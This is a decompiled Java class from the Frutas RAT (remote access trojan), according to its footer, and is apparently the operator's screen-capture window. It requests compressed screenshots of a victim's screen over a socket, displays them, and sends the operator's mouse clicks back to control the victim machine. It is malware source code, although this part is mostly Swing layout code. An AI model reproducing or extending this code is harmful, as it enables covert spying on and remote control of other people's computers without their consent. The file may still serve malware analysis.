/*     */ package cliente;
/*     */ 
/*     */ import java.awt.Color;
/*     */ import java.awt.Component;
/*     */ import java.awt.Container;
/*     */ import java.awt.Font;
/*     */ import java.awt.event.ActionEvent;
/*     */ import java.awt.event.ActionListener;
/*     */ import java.awt.event.MouseAdapter;
/*     */ import java.awt.event.MouseEvent;
/*     */ import java.awt.image.BufferedImage;
/*     */ import java.io.ByteArrayInputStream;
/*     */ import java.io.ByteArrayOutputStream;
/*     */ import java.io.IOException;
/*     */ import java.io.ObjectInputStream;
/*     */ import java.io.ObjectOutputStream;
/*     */ import java.io.PrintStream;
/*     */ import java.util.ResourceBundle;
/*     */ import java.util.logging.Level;
/*     */ import java.util.logging.Logger;
/*     */ import java.util.zip.GZIPInputStream;
/*     */ import javax.imageio.ImageIO;
/*     */ import javax.swing.GroupLayout;
/*     */ import javax.swing.GroupLayout.Alignment;
/*     */ import javax.swing.GroupLayout.ParallelGroup;
/*     */ import javax.swing.GroupLayout.SequentialGroup;
/*     */ import javax.swing.ImageIcon;
/*     */ import javax.swing.JButton;
/*     */ import javax.swing.JInternalFrame;
/*     */ import javax.swing.JLabel;
/*     */ import javax.swing.JPanel;
/*     */ import javax.swing.JRadioButton;
/*     */ import javax.swing.JScrollPane;
/*     */ import javax.swing.JSpinner;
/*     */ import javax.swing.LayoutStyle.ComponentPlacement;
/*     */ import javax.swing.SpinnerListModel;
/*     */ import javax.swing.SpinnerNumberModel;
/*     */ 
/*     */ public class CapturaPantalla extends JInternalFrame
/*     */   implements Runnable, SoporteLenguaje
/*     */ {
/*  21 */   private static int FORMATO = 4;
/*     */   ObjectInputStream in;
/*     */   ObjectOutputStream out;
/*     */   public boolean conetado;
/*  26 */   private String mouse = "0#0#0#0";
/*     */   private JRadioButton color;
/*     */   private JRadioButton gris;
/*     */   private JButton jButton2;
/*     */   private JLabel jLabel1;
/*     */   private JLabel jLabel2;
/*     */   private JLabel jLabel3;
/*     */   private JLabel jLabel4;
/*     */   private JLabel jLabel5;
/*     */   private JLabel jLabel6;
/*     */   private JLabel jLabel8;
/*     */   private JLabel jLabel9;
/*     */   private JPanel jPanel1;
/*     */   private JScrollPane jScrollPane1;
/*     */   private JSpinner scal;
/*     */   private JSpinner seconds;
/*     */   private JSpinner tipo;
/*     */ 
/*     */   public CapturaPantalla(ObjectInputStream in, ObjectOutputStream out, ResourceBundle rb)
/*     */   {
/*  30 */     initComponents();
/*     */     try {
/*  32 */       this.in = in;
/*  33 */       this.out = out;
/*  34 */       changeLenguage(rb);
/*     */     } catch (Exception ex) {
/*  36 */       Logger.getLogger(CapturaPantalla.class.getName()).log(Level.SEVERE, null, ex);
/*     */     }
/*     */   }
/*     */ 
/*     */   private void initComponents()
/*     */   {
/*  45 */     this.jPanel1 = new JPanel();
/*  46 */     this.jButton2 = new JButton();
/*  47 */     this.jLabel1 = new JLabel();
/*  48 */     this.seconds = new JSpinner();
/*  49 */     this.jLabel2 = new JLabel();
/*  50 */     this.scal = new JSpinner();
/*  51 */     this.jLabel4 = new JLabel();
/*  52 */     this.jLabel5 = new JLabel();
/*  53 */     this.jLabel6 = new JLabel();
/*  54 */     this.tipo = new JSpinner();
/*  55 */     this.color = new JRadioButton();
/*  56 */     this.gris = new JRadioButton();
/*  57 */     this.jLabel8 = new JLabel();
/*  58 */     this.jLabel9 = new JLabel();
/*  59 */     this.jScrollPane1 = new JScrollPane();
/*  60 */     this.jLabel3 = new JLabel();
/*     */ 
/*  62 */     setIconifiable(true);
/*  63 */     setMaximizable(true);
/*  64 */     setResizable(true);
/*  65 */     setTitle("Captura de Pantalla");
/*     */ 
/*  67 */     this.jButton2.setFont(new Font("Angelina", 1, 18));
/*  68 */     this.jButton2.setText("Parar");
/*  69 */     this.jButton2.addActionListener(new ActionListener() {
/*     */       public void actionPerformed(ActionEvent evt) {
/*  71 */         CapturaPantalla.this.jButton2ActionPerformed(evt);
/*     */       }
/*     */     });
/*  75 */     this.jLabel1.setFont(new Font("Angelina", 0, 14));
/*  76 */     this.jLabel1.setText("Segundos");
/*     */ 
/*  78 */     this.seconds.setModel(new SpinnerNumberModel(0, 0, 20, 1));
/*     */ 
/*  80 */     this.jLabel2.setText("Tamaño");
/*     */ 
/*  82 */     this.scal.setModel(new SpinnerNumberModel(50, 1, 99, 1));
/*     */ 
/*  84 */     this.jLabel4.setText("Bytes");
/*     */ 
/*  86 */     this.jLabel5.setText("Bytes Com.");
/*     */ 
/*  88 */     this.jLabel6.setText("Tipo");
/*     */ 
/*  90 */     this.tipo.setModel(new SpinnerListModel(new String[] { "jpg", "bmp", "jpeg", "png", "gif" }));
/*     */ 
/*  92 */     this.color.setSelected(true);
/*  93 */     this.color.setText("Color");
/*  94 */     this.color.addActionListener(new ActionListener() {
/*     */       public void actionPerformed(ActionEvent evt) {
/*  96 */         CapturaPantalla.this.colorActionPerformed(evt);
/*     */       }
/*     */     });
/* 100 */     this.gris.setText("Gris");
/* 101 */     this.gris.addActionListener(new ActionListener() {
/*     */       public void actionPerformed(ActionEvent evt) {
/* 103 */         CapturaPantalla.this.grisActionPerformed(evt);
/*     */       }
/*     */     });
/* 107 */     this.jLabel8.setText("Bytes Des.");
/*     */ 
/* 109 */     this.jLabel9.setText("Bytes");
/*     */ 
/* 111 */     GroupLayout jPanel1Layout = new GroupLayout(this.jPanel1);
/* 112 */     this.jPanel1.setLayout(jPanel1Layout);
/* 113 */     jPanel1Layout.setHorizontalGroup(jPanel1Layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(jPanel1Layout.createSequentialGroup().addContainerGap().addGroup(jPanel1Layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(GroupLayout.Alignment.TRAILING, jPanel1Layout.createSequentialGroup().addGap(0, 0, 32767).addComponent(this.jButton2)).addGroup(jPanel1Layout.createSequentialGroup().addGroup(jPanel1Layout.createParallelGroup(GroupLayout.Alignment.LEADING).addComponent(this.gris).addGroup(jPanel1Layout.createParallelGroup(GroupLayout.Alignment.LEADING, false).addComponent(this.jLabel1, -1, 69, 32767).addComponent(this.seconds).addComponent(this.jLabel4).addComponent(this.jLabel5).addComponent(this.jLabel2, -2, 47, -2).addComponent(this.scal).addComponent(this.jLabel6, -2, 47, -2).addComponent(this.tipo)).addComponent(this.color).addComponent(this.jLabel8).addComponent(this.jLabel9)).addGap(0, 0, 32767))).addContainerGap()));
/*     */ 
/* 140 */     jPanel1Layout.linkSize(0, new Component[] { this.jButton2, this.jLabel1 });
/*     */ 
/* 142 */     jPanel1Layout.setVerticalGroup(jPanel1Layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(jPanel1Layout.createSequentialGroup().addContainerGap().addComponent(this.jButton2, -2, 52, -2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jLabel1).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.seconds, -2, -1, -2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jLabel2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.scal, -2, -1, -2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jLabel6).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.tipo, -2, -1, -2).addGap(27, 27, 27).addComponent(this.color).addPreferredGap(LayoutStyle.ComponentPlacement.UNRELATED).addComponent(this.gris).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED, 69, 32767).addComponent(this.jLabel5).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jLabel4).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jLabel8).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jLabel9).addGap(7, 7, 7)));
/*     */ 
/* 174 */     this.jScrollPane1.setBackground(new Color(255, 102, 51));
/* 175 */     this.jScrollPane1.setForeground(new Color(255, 204, 51));
/* 176 */     this.jScrollPane1.setDoubleBuffered(true);
/*     */ 
/* 178 */     this.jLabel3.setHorizontalAlignment(2);
/* 179 */     this.jLabel3.setVerticalAlignment(1);
/* 180 */     this.jLabel3.setDoubleBuffered(true);
/* 181 */     this.jLabel3.addMouseListener(new MouseAdapter() {
/*     */       public void mouseClicked(MouseEvent evt) {
/* 183 */         CapturaPantalla.this.jLabel3MouseClicked(evt);
/*     */       }
/*     */     });
/* 186 */     this.jScrollPane1.setViewportView(this.jLabel3);
/*     */ 
/* 188 */     GroupLayout layout = new GroupLayout(getContentPane());
/* 189 */     getContentPane().setLayout(layout);
/* 190 */     layout.setHorizontalGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(layout.createSequentialGroup().addComponent(this.jPanel1, -2, -1, -2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jScrollPane1, -1, 667, 32767)));
/*     */ 
/* 197 */     layout.setVerticalGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addComponent(this.jScrollPane1).addComponent(this.jPanel1, -1, -1, 32767));
/*     */ 
/* 203 */     pack();
/*     */   }
/*     */ 
/*     */   private void jButton2ActionPerformed(ActionEvent evt) {
/*     */     try {
/* 208 */       this.in.close();
/*     */     } catch (IOException ex) {
/* 210 */       System.out.println("Cerre socket de video");
/*     */     }
/*     */   }
/*     */ 
/*     */   private void colorActionPerformed(ActionEvent evt)
/*     */   {
/* 217 */     this.gris.setSelected(false);
/* 218 */     this.color.setSelected(true);
/* 219 */     FORMATO = 4;
/*     */   }
/*     */ 
/*     */   private void grisActionPerformed(ActionEvent evt)
/*     */   {
/* 224 */     this.color.setSelected(false);
/* 225 */     this.gris.setSelected(true);
/* 226 */     FORMATO = 10;
/*     */   }
/*     */ 
/*     */   private void jLabel3MouseClicked(MouseEvent evt) {
/* 230 */     int tipo = 0;
/*     */ 
/* 232 */     switch (evt.getButton()) {
/*     */     case 1:
/* 234 */       tipo = 1024;
/* 235 */       break;
/*     */     case 2:
/* 237 */       tipo = 2048;
/* 238 */       break;
/*     */     case 3:
/* 240 */       tipo = 4096;
/*     */     }
/*     */ 
/* 245 */     synchronized (this.mouse) {
/* 246 */       this.mouse = ("1#" + evt.getX() + "#" + evt.getY() + "#" + tipo);
/*     */     }
/*     */   }
/*     */ 
/*     */   public void run()
/*     */   {
/* 275 */     String ttulo = getTitle();
/* 276 */     this.conetado = true;
/*     */     try {
/* 278 */       while (this.conetado)
/*     */       {
/* 280 */         int scala = Integer.parseInt(this.scal.getValue().toString());
/* 281 */         int delay = Integer.parseInt(this.seconds.getValue().toString());
/*     */ 
/* 284 */         this.out.writeInt(scala);
/* 285 */         this.out.flush();
/* 286 */         this.out.writeUTF(this.mouse);
/* 287 */         this.out.flush();
/* 288 */         this.mouse = "0#0#0#0";
/* 289 */         this.out.writeInt(delay);
/* 290 */         this.out.flush();
/* 291 */         this.out.writeUTF(this.tipo.getValue().toString());
/* 292 */         this.out.flush();
/* 293 */         this.out.writeInt(FORMATO);
/* 294 */         this.out.flush();
/* 295 */         byte[] by = (byte[])this.in.readObject();
/* 296 */         ByteArrayInputStream entradaImagen = new ByteArrayInputStream(by);
/* 297 */         GZIPInputStream gzipin = new GZIPInputStream(entradaImagen);
/* 298 */         entradaImagen.close();
/* 299 */         ByteArrayOutputStream baos = new ByteArrayOutputStream();
/* 300 */         byte[] bits = new byte[10000];
/*     */         int len;
/* 302 */         while ((len = gzipin.read(bits)) != -1) {
/* 303 */           baos.write(bits, 0, len);
/*     */         }
/* 305 */         gzipin.close();
/* 306 */         baos.close();
/* 307 */         ByteArrayInputStream inn = new ByteArrayInputStream(baos.toByteArray());
/* 308 */         BufferedImage m = ImageIO.read(inn);
/*     */ 
/* 310 */         this.jLabel3.setIcon(new ImageIcon(m));
/*     */ 
/* 318 */         this.jLabel4.setText(by.length + "");
/* 319 */         this.jLabel9.setText(baos.size() + "");
/*     */ 
/* 321 */         System.gc();
/*     */       }
/*     */ 
/*     */     }
/*     */     catch (Exception ex)
/*     */     {
/* 327 */       System.out.println("Socekt Cerrado");
/* 328 */       dispose();
/*     */     }
/* 330 */     dispose();
/*     */   }
/*     */ 
/*     */   public void changeLenguage(ResourceBundle rb)
/*     */   {
/* 337 */     setTitle(rb.getString("captura.titulo"));
/* 338 */     this.jButton2.setText(rb.getString("captura.boton"));
/* 339 */     this.jLabel1.setText(rb.getString("captura.segundo"));
/* 340 */     this.jLabel2.setText(rb.getString("captura.tamano"));
/* 341 */     this.jLabel6.setText(rb.getString("captura.tipo"));
/* 342 */     this.color.setText(rb.getString("captura.color"));
/* 343 */     this.gris.setText(rb.getString("captura.gris"));
/*     */   }
/*     */ }

/* Location:           C:\Users\Danilo\Desktop\Coisas\Frutas_RAT.jar
 * Qualified Name:     cliente.CapturaPantalla
 * JD-Core Version:    0.6.2
 */